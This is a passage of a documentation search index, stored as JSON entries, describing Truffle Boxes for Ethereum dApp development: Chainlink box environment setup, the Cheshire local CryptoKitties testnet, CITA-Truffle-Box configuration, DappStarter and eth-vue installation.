pay the gas fees. Then, if you want to migrate your contracts, simply call: truffle migrate --network dashboard You should then see prompts to sign the transactions on the dashboard view. Check out this video on how to use it with Truffle and HardHat here .", "title": "Truffle Dashboard"}, {"location": "boxes/chainlink-box/#environment-configuration", "text": "In some cases, you might want your transactions to be automatically signed. In which case, you will need to provide your wallet's private key An RPC URL A private key ETH & LINK token (either testnet or real) Let's look at an example of setting these up using the Sepolia testnet.", "title": "Environment configuration"}, {"location": "boxes/chainlink-box/#sepolia-ethereum-testnet-setup", "text": "First, we will need to set environment variables. We can do so by setting them in our .env file (create it if it's not there). You can also read more about environment variables from the linked twilio blog. You'll find a sample of what this file will look like in .env.example IMPORTANT: MAKE SURE YOU'D DONT EXPOSE THE KEYS YOU PUT IN THIS .env FILE. By that, I mean don't push them to a public repo, and please try to keep them keys you use in development not associated with any real funds. Set your SEPOLIA_RPC_URL environment variable. You can get one for free from Infura , Alchemy , or Moralis . This is your connection to the blockchain. Set your PRIVATE_KEY environment variable. This is your private key from your wallet, ie MetaMask . This is needed for deploying contracts to public networks. WARNING When developing, it's best practice to use a Metamask that isn't associated with any real money. A good way to do this is to use Truffle Dashboard. Alternatively, make a new browser profile (on Chrome, Brave, Firefox, etc) and install Metamask on that brower, and never send this wallet money. Don't commit and push any changes to .env files that may contain sensitive information, such as a private key! If this information reaches a public GitHub repository, someone can use it to check if you have any Mainnet funds in that wallet address, and steal them! .env example: SEPOLIA_RPC_URL='https://sepolia.infura.io/v3/asdfasdfasdfasdf' PRIVATE_KEY='abcdef' bash example export SEPOLIA_RPC_URL='https://sepolia.infura.io/v3/asdfasdfasdfasdf' export PRIVATE_KEY='abcdef' For other networks like mainnet and polygon, you can use different environment variables for your RPC URL and your private key. See the truffle-config.js to learn more. Uncomment the sepolia network in your truffle-config . You should now be all setup! You can run any command and just pass the --network sepolia now! To deploy all contracts: truffle migrate --network sepolia", "title": "Sepolia Ethereum Testnet Setup"}, {"location": "boxes/chainlink-box/#test", "text": "Tests are located in the test directory, and are split between unit tests and staging/testnet tests. Unit tests should only be run on local environments, and staging tests should only run on live environments. To run unit tests: truffle test", "title": "Test"}, {"location": "boxes/chainlink-box/#interacting-with-deployed-contracts", "text": "After deploying your contracts, the deployment output will give you the contract addresses as they are deployed. You can then use these contract addresses in conjunction with Truffle scripts to perform operations on each contract. Alternatively, if you want to interact with contracts on the fly, you can read about how to use truffle console or truffle develop here .", "title": "Interacting with Deployed Contracts"}, {"location": "boxes/chainlink-box/#chainlink-price-feeds", "text": "The Price Feeds consumer contract has one script, to read the latest price of a specified price feed contract. You can deploy just the price feed consumer with: truffle migrate --f 3 --to 3 --network <NETWORK> After deployment, run the following: truffle exec scripts/readPriceConsumer.js --network <NETWORK>", "title": "Chainlink Price Feeds"}, {"location": "boxes/chainlink-box/#request-receive-data", "text": "The API Consumer contract has one script, to request data from the API and wait for a response. You can deploy just the API Consumer with: truffle migrate --f 4 --to 4 --network <NETWORK> After deployment, run the following: yarn truffle exec scripts/requestAndReadAPI.js --network <NETWORK>", "title": "Request &amp; Receive Data"}, {"location": "boxes/chainlink-box/#vrf-get-a-random-number", "text": "The VRF Consumer contract has one script, to request a random number and wait for a response. You can deploy just the VRF Consumer with: truffle deploy --f 5 --to 5 --network <NETWORK> After deployment, you'll need to add your contract address to your subscription. Head over to vrf.chain.link and add your consumer. Then, run the following: truffle exec scripts/requestAndReadRandomNumber.js --network <NETWORK>", "title": "VRF Get a random number"}, {"location": "boxes/chainlink-box/#keepers", "text": "The Keepers Consumer contract has one script, to check the upkeep. After deployment, run the following: truffle exec scripts/checkUpkeep.js --network <NETWORK> To see everything in action, you'll want to set up a consumer at keepers.chain.link .", "title": "Keepers"}, {"location": "boxes/chainlink-box/#verify-on-etherscan", "text": "You'll need an ETHERSCAN_API_KEY environment variable. You can get one from the Etherscan API site. . If you have it set, your deploy script will try to verify them by default, but if you want to verify any manually, you can run: truffle run verify <CONTRACT> --network <NETWORK> example: truffle run verify PriceConsumerV3 --network sepolia", "title": "Verify on Etherscan"}, {"location": "boxes/chainlink-box/#contributing", "text": "Contributions are always welcome! Open a PR or an issue!", "title": "Contributing"}, {"location": "boxes/chainlink-box/#thank-you", "text": "", "title": "Thank You!"}, {"location": "boxes/chainlink-box/#resources", "text": "Chainlink Documentation Truffle Documentation", "title": "Resources"}, {"location": "boxes/cheshire/", "text": "Cheshire \u00b6 Cheshire enables fast CryptoKitties dApp development by providing local implementations of the CryptoKitties web API and smart contracts. It features: An Ethereum testnet running the CryptoKitties smart contracts An HTTP server running a minimal implementation of the CryptoKitties web API : /kitties /kitties/:id /user/:address A simple Node.js framework for seeding the development environment with realistic data and bootstraping your dApp Cheshire has simplified and accelerated development at Endless Nameless considerably. We're excited to share it. Installation \u00b6 You can install Cheshire with git or as a Truffle Box . Git \u00b6 git clone http://github.com/endless-nameless-inc/cheshire cd cheshire yarn install Truffle box \u00b6 truffle unbox endless-nameless-inc/cheshire Usage \u00b6 Cheshire is meant to be used with the Truffle Framework , but can function as a standalone service, depending on your workflow. Start Cheshire \u00b6 To start Cheshire, run: yarn start This does the following: Starts an Ethereum testnet ( ganache-cli ) Deploys CryptoKitties's KittyCore , SaleClockAuction , and SiringClockAuction contracts to the testnet Starts a local CryptoKitties API server Executes /scripts/setup.js The output should look something like this: > Starting database... > Starting testnet... > Compiling contracts... > Deploying CryptoKitties contracts to testnet... > Starting local CryptoKitties API server... > Running setup script... Cheshire is live \ud83d\ude3a Here's what's inside: Available Accounts ==================== (0) 0x182fc09c33fdd6c2f5b2562f3ca721fa954689c8 ... (9) 0xcdf40e926a778d93429b72c341b4a9e0ee8624c4 Private Keys ==================== (0) 0x76a67ae288fd67ea8d4f7fb94f50c36b606d9448db579584af90d52105f9d8cf ... (9) 0x6e77cfded732de6d423abcaccc45ee8c4bdc2eb3c0c47938acb386ac17c496b8 Testnet Contracts ==================== KittyCore: 0xa751b62893867d0608a2ada5d17d0c43e3433040 SaleClockAuction: 0x1ab49d53d0bff0202ec4b330349b427155bba7ac SiringClockAuction: 0x671843106e07f9d835d7299381cd14863af18593 Services ==================== Ethereum testnet listening on port 8546 CryptoKitties API listening on port 4000 Cheshire dashboard available at http://localhost:4000 View the above at any time by running `yarn run help` Eureka! When Cheshire's running, you have your very own local copy of CryptoKitties, enabling you to build your dApp with the speed and convenience of testnet. Let's try it out. Interacting with your local CryptoKitties API \u00b6 Cheshire automatically imports the Genesis kitty. To fetch the Genesis kitty from your local CryptoKitties API, run: $ curl http://localhost:4000/kitties/1 The response should look exactly like the response returned by CryptoKitties's production API . See the scripts section below to learn how to seed your environment with more data. Interacting with the testnet contracts \u00b6 To interact with the testnet contracts, start by opening a Truffle console: $ truffle console --network cheshire Then, taking note of the KittyCore testnet address displayed when you started Cheshire, create an instance of KittyCore, and use the getKitty function to fetch the Genesis kitty's genes: truffle ( cheshire ) > // Be sure to replace the KittyCore address below truffle ( cheshire ) > kittyCore = KittyCore.at ( '0xa751b62893867d0608a2ada5d17d0c43e3433040' ) truffle ( cheshire ) > kittyCore.getKitty ( 1 ) The response should be pretty similar to the one you get from the mainnet contract . Suggested Conventions \u00b6 You'll get the most out of Cheshire by adopting these conventions: Store your contracts in the /contracts directory Design the web application layers of your stack to reference Cheshire's environment variables (hat tip to the twelve-factor methodology) Update your setup script to deploy your contracts to testnet Update your setup script to start your dApp's web application Scripts \u00b6 Cheshire provides a simple scripting framework designed to help seed the development environment with realistic data, primarily by importing kitties from mainnet. A Cheshire script is just a Node.js module that runs in the context of the Cheshire environment. Here's an example of a script that imports a Bug Cat from mainnet to your testnet. // /scripts/import-bug-cat.js module . exports = async function importBugCat ( cheshire ) { const bugCatIdMainnet = 101 const ownerTestnet = cheshire . accounts [ 0 ]. address const kittyIdTestnet = await cheshire . importKitty ( bugCatIdMainnet , ownerTestnet ) console . log ( `Kitty # ${ kittyIdTestnet } => ${ ownerTestnet } ` ) } To run this script, you would execute the following command: $ yarn run script ./scripts/import-bug-cat.js The output would look something like: Kitty #2 => 0x182fc09c33fdd6c2f5b2562f3ca721fa954689c8 Setup Script \u00b6 Cheshire executes /scripts/setup.js when started. You should update the setup.js shipped with Cheshire to: Deploy your dApp's contracts to testnet. For example: const kittyRace = await cheshire.deployContract('KittyRace', process.env.ADDRESS_KITTY_CORE) log('KittyRace deployed at:', kittyRace.address) Start your dApp's web application, so it inherits the various environment variables set by Cheshire. We recommend adopting the convention in the setup.js shipped with Cheshire which simply expects the APP_START environment variable to contain a command that starts your dApp's web application. For example: APP_START=\"cd ~/Projects/kittyrace-web; bundle exec rails server\" yarn start You can run any script in place of setup.js by passing its path to yarn start . This is handy for setting up specific scenarios, such as a KittyRace with 9 registered racers: yarn start ./scripts/setup-registered-racers.js 9 Cheshire API Reference \u00b6 Cheshire scripts receive an instance of the Cheshire class with these methods: accounts() \u00b6 Returns array of available Ethereum accounts (the same accounts defined in config.json) contractAddress(contractName) \u00b6 Returns address of contractName contractInstance(contractName) \u00b6 Returns an instance of contractName as a web3.eth.contract object createKitty(matronId, sireId, generation, genes, owner, apiObject) \u00b6 Create a kitty with the given parameters. Returns the kitty's ID. async deployContract(contractName, ...constructorArgs) \u00b6 Deploy contractName to testnet. Cheshire compiles all contracts in /contracts at start time. Expects /contracts/ContractName.sol to exist. Returns an instance of contractName as a web3.eth.contract object async importKitty(kittyIdMainnet, ownerTestnet) \u00b6 Import a kitty from mainnet, and assign it to ownerTestnet Returns the testnet kitty's ID. async importUser(addressMainnet, addressTestnet) \u00b6 Import user's profile and kitties from mainnet, and assign to addressTestnet . Returns address of testnet user. Cheshire Environment Variables \u00b6 Cheshire sets several environment variables before running any script: ADDRESS_KITTY_CORE ADDRESS_SALE_CLOCK_AUCTION ADDRESS_SIRING_CLOCK_AUCTION URL_CRYPTO_KITTIES_API In addition to these, the address for any contract deployed with a Cheshire script will be stored in an environment variable named with the convention, ADDRESS_<CONTRACT_NAME> . Configuration \u00b6 The config.json file defines the following: accounts - list of Ethereum accounts to load into testnet ethNodeMainnet - URL for the node used to access the Ethereum mainnet addressKittyCoreMainnet - address of the mainnet KittyCore contract portTestnet - port bound by Ethereum testnet portApi - port bound by local CryptoKitties API Utilities \u00b6 Mine \u00b6 To mine some number of blocks on your testnet: yarn run mine <num blocks> Help \u00b6 Print information about the environment including available Ethereum accounts, contract addresses, etc. yarn run help Cheshire Dashboard \u00b6 Cheshire ships with a simple dashboard you can access at http://localhost:4000 Developer notes \u00b6 KittyCore \u00b6 The smart contracts bundled with Cheshire are identical to those in production except for KittyCore, to which we've added an external createKitty function that lets us push kitties into the local testnet contract. function createKitty ( uint256 _matronId , uint256 _sireId , uint256 _generation , uint256 _genes , address _owner ) external returns ( uint ) { return _createKitty ( _matronId , _sireId , _generation , _genes , _owner ); } Contributions \u00b6 Cheshire works pretty well for us at Endless Nameless , but there's probably a whole lot more it could do! If you're interested in contributing, we humbly request the following: Adhere to Airbnb's JavaScript style guide ( yarn eslint makes it easy) Include tests. We're happy when yarn test is happy, and yarn test is only happy when coverage is 100% \ud83e\udd13 Acknowledgements \u00b6 We're grateful for the contributions of the many open source projects on which Cheshire depends, none more so than the excellent Truffle Suite . Cheshire is by Endless Nameless . It is based on tools and processes we developed while building KittyRace , a CryptoKitties dApp. We hope Cheshire makes it easier to #buidl \ud83e\udd18 Your name here - we will gladly review PRs.", "title": "Index"}, {"location": "boxes/cheshire/#cheshire", "text": "Cheshire enables fast CryptoKitties dApp development by providing local implementations of the CryptoKitties web API and smart contracts. It features: An Ethereum testnet running the CryptoKitties smart contracts An HTTP server running a minimal implementation of the CryptoKitties web API : /kitties /kitties/:id /user/:address A simple Node.js framework for seeding the development environment with realistic data and bootstraping your dApp Cheshire has simplified and accelerated development at Endless Nameless considerably. We're excited to share it.", "title": "Cheshire"}, {"location": "boxes/cheshire/#installation", "text": "You can install Cheshire with git or as a Truffle Box .", "title": "Installation"}, {"location": "boxes/cheshire/#git", "text": "git clone http://github.com/endless-nameless-inc/cheshire cd cheshire yarn install", "title": "Git"}, {"location": "boxes/cheshire/#truffle-box", "text": "truffle unbox endless-nameless-inc/cheshire", "title": "Truffle box"}, {"location": "boxes/cheshire/#usage", "text": "Cheshire is meant to be used with the Truffle Framework , but can function as a standalone service, depending on your workflow.", "title": "Usage"}, {"location": "boxes/cheshire/#start-cheshire", "text": "To start Cheshire, run: yarn start This does the following: Starts an Ethereum testnet ( ganache-cli ) Deploys CryptoKitties's KittyCore , SaleClockAuction , and SiringClockAuction contracts to the testnet Starts a local CryptoKitties API server Executes /scripts/setup.js The output should look something like this: > Starting database... > Starting testnet... > Compiling contracts... > Deploying CryptoKitties contracts to testnet... > Starting local CryptoKitties API server... > Running setup script... Cheshire is live \ud83d\ude3a Here's what's inside: Available Accounts ==================== (0) 0x182fc09c33fdd6c2f5b2562f3ca721fa954689c8 ... (9) 0xcdf40e926a778d93429b72c341b4a9e0ee8624c4 Private Keys ==================== (0) 0x76a67ae288fd67ea8d4f7fb94f50c36b606d9448db579584af90d52105f9d8cf ... (9) 0x6e77cfded732de6d423abcaccc45ee8c4bdc2eb3c0c47938acb386ac17c496b8 Testnet Contracts ==================== KittyCore: 0xa751b62893867d0608a2ada5d17d0c43e3433040 SaleClockAuction: 0x1ab49d53d0bff0202ec4b330349b427155bba7ac SiringClockAuction: 0x671843106e07f9d835d7299381cd14863af18593 Services ==================== Ethereum testnet listening on port 8546 CryptoKitties API listening on port 4000 Cheshire dashboard available at http://localhost:4000 View the above at any time by running `yarn run help` Eureka! When Cheshire's running, you have your very own local copy of CryptoKitties, enabling you to build your dApp with the speed and convenience of testnet. Let's try it out.", "title": "Start Cheshire"}, {"location": "boxes/cheshire/#interacting-with-your-local-cryptokitties-api", "text": "Cheshire automatically imports the Genesis kitty. To fetch the Genesis kitty from your local CryptoKitties API, run: $ curl http://localhost:4000/kitties/1 The response should look exactly like the response returned by CryptoKitties's production API . See the scripts section below to learn how to seed your environment with more data.", "title": "Interacting with your local CryptoKitties API"}, {"location": "boxes/cheshire/#interacting-with-the-testnet-contracts", "text": "To interact with the testnet contracts, start by opening a Truffle console: $ truffle console --network cheshire Then, taking note of the KittyCore testnet address displayed when you started Cheshire, create an instance of KittyCore, and use the getKitty function to fetch the Genesis kitty's genes: truffle ( cheshire ) > // Be sure to replace the KittyCore address below truffle ( cheshire ) > kittyCore = KittyCore.at ( '0xa751b62893867d0608a2ada5d17d0c43e3433040' ) truffle ( cheshire ) > kittyCore.getKitty ( 1 ) The response should be pretty similar to the one you get from the mainnet contract .", "title": "Interacting with the testnet contracts"}, {"location": "boxes/cheshire/#suggested-conventions", "text": "You'll get the most out of Cheshire by adopting these conventions: Store your contracts in the /contracts directory Design the web application layers of your stack to reference Cheshire's environment variables (hat tip to the twelve-factor methodology) Update your setup script to deploy your contracts to testnet Update your setup script to start your dApp's web application", "title": "Suggested Conventions"}, {"location": "boxes/cheshire/#scripts", "text": "Cheshire provides a simple scripting framework designed to help seed the development environment with realistic data, primarily by importing kitties from mainnet. A Cheshire script is just a Node.js module that runs in the context of the Cheshire environment. Here's an example of a script that imports a Bug Cat from mainnet to your testnet. // /scripts/import-bug-cat.js module . exports = async function importBugCat ( cheshire ) { const bugCatIdMainnet = 101 const ownerTestnet = cheshire . accounts [ 0 ]. address const kittyIdTestnet = await cheshire . importKitty ( bugCatIdMainnet , ownerTestnet ) console . log ( `Kitty # ${ kittyIdTestnet } => ${ ownerTestnet } ` ) } To run this script, you would execute the following command: $ yarn run script ./scripts/import-bug-cat.js The output would look something like: Kitty #2 => 0x182fc09c33fdd6c2f5b2562f3ca721fa954689c8", "title": "Scripts"}, {"location": "boxes/cheshire/#setup-script", "text": "Cheshire executes /scripts/setup.js when started. You should update the setup.js shipped with Cheshire to: Deploy your dApp's contracts to testnet. For example: const kittyRace = await cheshire.deployContract('KittyRace', process.env.ADDRESS_KITTY_CORE) log('KittyRace deployed at:', kittyRace.address) Start your dApp's web application, so it inherits the various environment variables set by Cheshire. We recommend adopting the convention in the setup.js shipped with Cheshire which simply expects the APP_START environment variable to contain a command that starts your dApp's web application. For example: APP_START=\"cd ~/Projects/kittyrace-web; bundle exec rails server\" yarn start You can run any script in place of setup.js by passing its path to yarn start . This is handy for setting up specific scenarios, such as a KittyRace with 9 registered racers: yarn start ./scripts/setup-registered-racers.js 9", "title": "Setup Script"}, {"location": "boxes/cheshire/#cheshire-api-reference", "text": "Cheshire scripts receive an instance of the Cheshire class with these methods:", "title": "Cheshire API Reference"}, {"location": "boxes/cheshire/#accounts", "text": "Returns array of available Ethereum accounts (the same accounts defined in config.json)", "title": "accounts()"}, {"location": "boxes/cheshire/#contractaddresscontractname", "text": "Returns address of contractName", "title": "contractAddress(contractName)"}, {"location": "boxes/cheshire/#contractinstancecontractname", "text": "Returns an instance of contractName as a web3.eth.contract object", "title": "contractInstance(contractName)"}, {"location": "boxes/cheshire/#createkittymatronid-sireid-generation-genes-owner-apiobject", "text": "Create a kitty with the given parameters. Returns the kitty's ID.", "title": "createKitty(matronId, sireId, generation, genes, owner, apiObject)"}, {"location": "boxes/cheshire/#async-deploycontractcontractname-constructorargs", "text": "Deploy contractName to testnet. Cheshire compiles all contracts in /contracts at start time. Expects /contracts/ContractName.sol to exist. Returns an instance of contractName as a web3.eth.contract object", "title": "async deployContract(contractName, ...constructorArgs)"}, {"location": "boxes/cheshire/#async-importkittykittyidmainnet-ownertestnet", "text": "Import a kitty from mainnet, and assign it to ownerTestnet Returns the testnet kitty's ID.", "title": "async importKitty(kittyIdMainnet, ownerTestnet)"}, {"location": "boxes/cheshire/#async-importuseraddressmainnet-addresstestnet", "text": "Import user's profile and kitties from mainnet, and assign to addressTestnet . Returns address of testnet user.", "title": "async importUser(addressMainnet, addressTestnet)"}, {"location": "boxes/cheshire/#cheshire-environment-variables", "text": "Cheshire sets several environment variables before running any script: ADDRESS_KITTY_CORE ADDRESS_SALE_CLOCK_AUCTION ADDRESS_SIRING_CLOCK_AUCTION URL_CRYPTO_KITTIES_API In addition to these, the address for any contract deployed with a Cheshire script will be stored in an environment variable named with the convention, ADDRESS_<CONTRACT_NAME> .", "title": "Cheshire Environment Variables"}, {"location": "boxes/cheshire/#configuration", "text": "The config.json file defines the following: accounts - list of Ethereum accounts to load into testnet ethNodeMainnet - URL for the node used to access the Ethereum mainnet addressKittyCoreMainnet - address of the mainnet KittyCore contract portTestnet - port bound by Ethereum testnet portApi - port bound by local CryptoKitties API", "title": "Configuration"}, {"location": "boxes/cheshire/#utilities", "text": "", "title": "Utilities"}, {"location": "boxes/cheshire/#mine", "text": "To mine some number of blocks on your testnet: yarn run mine <num blocks>", "title": "Mine"}, {"location": "boxes/cheshire/#help", "text": "Print information about the environment including available Ethereum accounts, contract addresses, etc. yarn run help", "title": "Help"}, {"location": "boxes/cheshire/#cheshire-dashboard", "text": "Cheshire ships with a simple dashboard you can access at http://localhost:4000", "title": "Cheshire Dashboard"}, {"location": "boxes/cheshire/#developer-notes", "text": "", "title": "Developer notes"}, {"location": "boxes/cheshire/#kittycore", "text": "The smart contracts bundled with Cheshire are identical to those in production except for KittyCore, to which we've added an external createKitty function that lets us push kitties into the local testnet contract. function createKitty ( uint256 _matronId , uint256 _sireId , uint256 _generation , uint256 _genes , address _owner ) external returns ( uint ) { return _createKitty ( _matronId , _sireId , _generation , _genes , _owner ); }", "title": "KittyCore"}, {"location": "boxes/cheshire/#contributions", "text": "Cheshire works pretty well for us at Endless Nameless , but there's probably a whole lot more it could do! If you're interested in contributing, we humbly request the following: Adhere to Airbnb's JavaScript style guide ( yarn eslint makes it easy) Include tests. We're happy when yarn test is happy, and yarn test is only happy when coverage is 100% \ud83e\udd13", "title": "Contributions"}, {"location": "boxes/cheshire/#acknowledgements", "text": "We're grateful for the contributions of the many open source projects on which Cheshire depends, none more so than the excellent Truffle Suite . Cheshire is by Endless Nameless . It is based on tools and processes we developed while building KittyRace , a CryptoKitties dApp. We hope Cheshire makes it easier to #buidl \ud83e\udd18 Your name here - we will gladly review PRs.", "title": "Acknowledgements"}, {"location": "boxes/cita-truffle-box/", "text": "CITA-Truffle-Box \u00b6 English | \u7b80\u4f53\u4e2d\u6587 CITA-Truffle-Box is based on truffle-box to develop and used for developing DApps on CITA. Please refer to our document for more details about CITA. Notice: This project rewrite truffle migrate part of truffle-box , please read truffle-tutorial first, especially RUNNING MIGRATIONS part. Installation \u00b6 Install Truffle globally To use CITA-Truffle-Box, please install truffle. yarn global add truffle Download git clone https://github.com/cryptape/cita-truffle-box.git cd cita-truffle-box/ rm -rf .git yarn install Configuration \u00b6 You can configure your box in truffle.js . The configure options are shown below. module . exports = { networks : { development : { host : 'ip_address' , // eg. '121.196.200.225' port : 'port' , // eg. 1337 network_id : '*' , // Use '*' to match any network id privateKey : 'private key' , // a string, required // the following parameters are OPTIONAL // validUntilBlock: 999999, // an int, default to (current block number)+88 // nonce: '999', // a string, default to random int // quota: 999999, // an int, defaut to 999999 }, // you can add other network after here }, } networks \u00b6 You must use 'development' as the key for now. host [required] Specify the host ip_address, don't add protocol name. port [required] Specify the host port. network_id [required] In order to be compatible with truffle, you have to set this attribute, but it's meaningless here. privateKey [required] Your private key for sending transaction. nonce [optional] Nonce is a string used to prevent double-spending, default to be a random number from 1 ~ 100. Note that the type of nonce is string. quota [optional] Similar to gas in ethereum, default value is 99999. validUntilBlock [optional] Similar to timeout, default to be current block height + 88 Compile \u00b6 Compile the smart contract. truffle compile Migration \u00b6 First, add your migration scripts in /migration , for the details, please refer RUNNING MIGRATIONS for more details. Input the command to do migration. (Note that we can NOT use truffle migrate command here...) yarn migrate", "title": "Index"}, {"location": "boxes/cita-truffle-box/#cita-truffle-box", "text": "English | \u7b80\u4f53\u4e2d\u6587 CITA-Truffle-Box is based on truffle-box to develop and used for developing DApps on CITA. Please refer to our document for more details about CITA. Notice: This project rewrite truffle migrate part of truffle-box , please read truffle-tutorial first, especially RUNNING MIGRATIONS part.", "title": "CITA-Truffle-Box"}, {"location": "boxes/cita-truffle-box/#installation", "text": "Install Truffle globally To use CITA-Truffle-Box, please install truffle. yarn global add truffle Download git clone https://github.com/cryptape/cita-truffle-box.git cd cita-truffle-box/ rm -rf .git yarn install", "title": "Installation"}, {"location": "boxes/cita-truffle-box/#configuration", "text": "You can configure your box in truffle.js . The configure options are shown below. module . exports = { networks : { development : { host : 'ip_address' , // eg. '121.196.200.225' port : 'port' , // eg. 1337 network_id : '*' , // Use '*' to match any network id privateKey : 'private key' , // a string, required // the following parameters are OPTIONAL // validUntilBlock: 999999, // an int, default to (current block number)+88 // nonce: '999', // a string, default to random int // quota: 999999, // an int, defaut to 999999 }, // you can add other network after here }, }", "title": "Configuration"}, {"location": "boxes/cita-truffle-box/#networks", "text": "You must use 'development' as the key for now. host [required] Specify the host ip_address, don't add protocol name. port [required] Specify the host port. network_id [required] In order to be compatible with truffle, you have to set this attribute, but it's meaningless here. privateKey [required] Your private key for sending transaction. nonce [optional] Nonce is a string used to prevent double-spending, default to be a random number from 1 ~ 100. Note that the type of nonce is string. quota [optional] Similar to gas in ethereum, default value is 99999. validUntilBlock [optional] Similar to timeout, default to be current block height + 88", "title": "networks"}, {"location": "boxes/cita-truffle-box/#compile", "text": "Compile the smart contract. truffle compile", "title": "Compile"}, {"location": "boxes/cita-truffle-box/#migration", "text": "First, add your migration scripts in /migration , for the details, please refer RUNNING MIGRATIONS for more details. Input the command to do migration. (Note that we can NOT use truffle migrate command here...) yarn migrate", "title": "Migration"}, {"location": "boxes/dappstarter-trufflebox/", "text": "Decentology DappStarter Truffle Box \u00b6 This box comes with DappStarter and when unboxed will scaffold a DappStarter receipt project. Projects come with: - Client side framework - Blockchain library - Smart Contracts - Test Blockchain Environment (Server & Accounts) - Web server service All components are wired together and update for you out of the box for an end to end developer experience Install \u00b6 To get started simply run npx truffle unbox decentology/dappstarter-trufflebox", "title": "Index"}, {"location": "boxes/dappstarter-trufflebox/#decentology-dappstarter-truffle-box", "text": "This box comes with DappStarter and when unboxed will scaffold a DappStarter receipt project. Projects come with: - Client side framework - Blockchain library - Smart Contracts - Test Blockchain Environment (Server & Accounts) - Web server service All components are wired together and update for you out of the box for an end to end developer experience", "title": "Decentology DappStarter Truffle Box"}, {"location": "boxes/dappstarter-trufflebox/#install", "text": "To get started simply run npx truffle unbox decentology/dappstarter-trufflebox", "title": "Install"}, {"location": "boxes/eth-vue/", "text": "You can quickly get a private blockchain up and running from blockchain-starter eth-vue Truffle Box: With Ganache Blockchain Option, Ropsten Network Configuration, and Gravatar access \u00b6 This Truffle Box provides everything you need to quickly build Ethereum dApps that have authentication features with Vue 3 , including configuration for easy deployment to the Ropsten Network. It's also Gravatar-enabled. Connecting to a running Ganache blockchain network from Truffle is also possible -- for fast development and testing purposes. Built on Truffle 5 , eth-vue uses vuex for state management, vuex-persist for local storage of app state, and vue-router for routing. Authentication functionalities are handled by Smart Contracts running on the Ethereum blockchain. With deployment configuration for the Ropsten Network, deployment to the remote test network doesn't have to be a pain anymore. It's now as simple as truffle migrate --network ropsten If you have a running Ganache blockchain network, configuring with eth-vue will connect you immediately to the private blockchain. Visit the Ganache page for installation and startup instructions, install Ganache, and eth-vue will connect accordingly. Simply unbox and start building your own dApp. Installation \u00b6 Install Truffle yarn global add truffle NOTE: If unboxing DOkwufulueze/eth-vue had failed previously due to absence of node-gyp, simply run yarn global add node-gyp . Or if it failed due to a problem with an existing node-gyp, run node-gyp rebuild . Else ignore this note and move on to the next instruction \u00b6 Enter your development directory [eg. cd into a newly created eth-vue directory] and unbox DOkwufulueze/eth-vue truffle unbox DOkwufulueze/eth-vue Or clone this repository from GitHub and cd into the eth-vue directory: git clone https://github.com/DOkwufulueze/eth-vue.git Configure your environment Open the truffle.js file. You'll find the following: ... module.exports = { ... networks: { development: { host: \"localhost\", port: 8545, // This is the conventional port. If you're using the Ganache Blockchain, change port value to the Ganache default port 7545. If you're using Truffle develop network, change port value to 9545 network_id: \"*\", // Match any network id. You may need to replace * with your network Id from: \"\", // Add your unlocked account within the double quotes gas: 4444444 } } }; Insert your unlocked account within the double-quotes of the from key Open the src/util/constants.js file. You'll find the following: export const NETWORKS = { '1': 'Main Net', '2': 'Deprecated Morden test network', '3': 'Ropsten test network', '4': 'Rinkeby test network', '42': 'Kovan test network', '4447': 'Truffle Develop Network', '5777': 'Ganache Blockchain', '666': 'Daniel Private Blockchain' // This is a test private blockchain. You can change it to your own private blockchain if you have one. }; export const APPROVED_NETWORK_ID = \"3\"; // Default is Ropsten. Set as you choose ... The default network above is the Ropsten network [ APPROVED_NETWORK_ID = '3' ], but you can change this, as Ropsten was chosen for testing purpose only. If your choice network is on the list of NETWORKS but is not Ropsten, then change the value of APPROVED_NETWORK_ID to the ID of your choice network. For example, if one is to use the private Blockchain above [ '666': 'Daniel Private Blockchain' ], then APPROVED_NETWORK_ID would be '666' . But if your choice network is not on the NETWORKS list, simply add your network using the existing pattern [ <networkId>: <networkName> ], and change the value of APPROVED_NETWORK_ID to the ID of your choice network. If you're using Ganache, please remember to point your Ethereum provider [Metamask, for example] to a Custom RPC running on port 7545. For Truffle develop network, point your Ethereum provider [Metamask, for example] to a Custom RPC running on port 9545. Install dependencies if necessary. ###### NOTE: If you unboxed this boilerplate from Truffle [ truffle unbox DOkwufulueze/eth-vue ], then running yarn install is not necessary since unboxing installs dependencies by default. But if you cloned this boilerplate from GitHub [ git clone https://github.com/DOkwufulueze/eth-vue.git ], please run yarn install as stated below yarn install Compilation and Migration \u00b6 To deploy the contracts, you can either compile and migrate to your custom network as configured in the truffle.js file or you could use the test network and test addresses that truffle 4 provides. Find details for both deployment processes below. Compile and Migrate to your custom network as configured in truffle.js . [For the Ganache Blockchain, it runs on port 7545 and doesn't conflict with any conventional port. So edit your truffle.js file appropriately before deploying] \u00b6 Compile the Contracts [remember to add the --network ropsten option if you didn't change the APPROVED_NETWORK_ID in src/util/constants.js from the default 3 to another id] truffle compile Deploy the compiled contracts [remember to add the --network ropsten option if you didn't change the APPROVED_NETWORK_ID in src/util/constants.js from the default 3 to another id] truffle migrate Compile and Migrate to the Ropsten test network [this is very straightforward] \u00b6 Compile the Contracts on Ropsten truffle compile --network ropsten Deploy the compiled Contracts to Ropsten truffle migrate --network ropsten Compile and Migrate using the truffle develop environment \u00b6 The default port for truffle develop is 9545, so it doesn't conflict with any conventional port. Edit truffle.js appropriately. - Enter the truffle develop environment truffle develop Compile the Contracts compile Deploy the compiled contracts migrate Launch the dApp \u00b6 Start the server yarn start The eth-vue DApp should now be running on http://localhost:3001 as you can see from your browser. And that's it, you're DONE! \u00b6 Please send bug issues you may encounter to Issues \u00b6 Copyleft \u00b6 2017 Daniel Okwufulueze Licence \u00b6 This dApp is distributed under the GNU GPL-3.0 licence.", "title": "Index"}, {"location": "boxes/eth-vue/#eth-vue-truffle-box-with-ganache-blockchain-option-ropsten-network-configuration-and-gravatar-access", "text": "This Truffle Box provides everything you need to quickly build Ethereum dApps that have authentication features with Vue 3 , including configuration for easy deployment to the Ropsten Network. It's also Gravatar-enabled. Connecting to a running Ganache blockchain network from Truffle is also possible -- for fast development and testing purposes. Built on Truffle 5 , eth-vue uses vuex for state management, vuex-persist for local storage of app state, and vue-router for routing. Authentication functionalities are handled by Smart Contracts running on the Ethereum blockchain. With deployment configuration for the Ropsten Network, deployment to the remote test network doesn't have to be a pain anymore. It's now as simple as truffle migrate --network ropsten If you have a running Ganache blockchain network, configuring with eth-vue will connect you immediately to the private blockchain. Visit the Ganache page for installation and startup instructions, install Ganache, and eth-vue will connect accordingly. Simply unbox and start building your own dApp.", "title": "eth-vue Truffle Box: With Ganache Blockchain Option, Ropsten Network Configuration, and Gravatar access"}, {"location": "boxes/eth-vue/#installation", "text": 